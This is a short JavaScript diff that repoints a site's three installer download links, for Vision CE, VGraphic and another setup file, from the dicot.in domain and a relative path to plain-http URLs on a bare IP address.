@@ -64,15 +64,15 @@ function to_download() {
 }
 
 function download_vc() {
-    location.href = "setup.exe";
+    location.href = "http://15.207.243.5/setup.exe";
 }
 
 function download_vce() {
-    location.href = "https://www.dicot.in/Vision_CE_setup.exe";
+    location.href = "http://15.207.243.5/Vision_CE_setup.exe";
 }
 
 function download_vg() {
-    location.href = "https://www.dicot.in/VGraphicsetup.exe";
+    location.href = "http://15.207.243.5/VGraphicsetup.exe";
 }
 
 function inq() {
